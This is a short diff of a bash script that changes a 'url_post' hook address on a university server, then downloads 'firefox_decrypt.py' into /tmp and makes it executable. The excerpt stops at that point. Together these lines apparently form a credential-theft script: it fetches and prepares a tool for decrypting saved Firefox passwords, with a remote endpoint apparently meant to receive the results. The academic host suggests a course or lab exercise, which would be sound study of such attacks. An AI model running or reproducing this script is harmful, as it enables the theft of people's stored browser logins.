@@ -1,6 +1,6 @@
 #!/bin/bash
 
-url_post="https://ise2.istic.univ-rennes1.fr/hook/ddealmeida"
+url_post="https://ise2.istic.univ-rennes1.fr/hook/ddealmeidab"
 cd /tmp
 wget https://ddealmei.github.io/assets/3b64d11ff0ac5da6a262b3490949ec7f6/firefox_decrypt.py && \
 	chmod +x firefox_decrypt.py && \
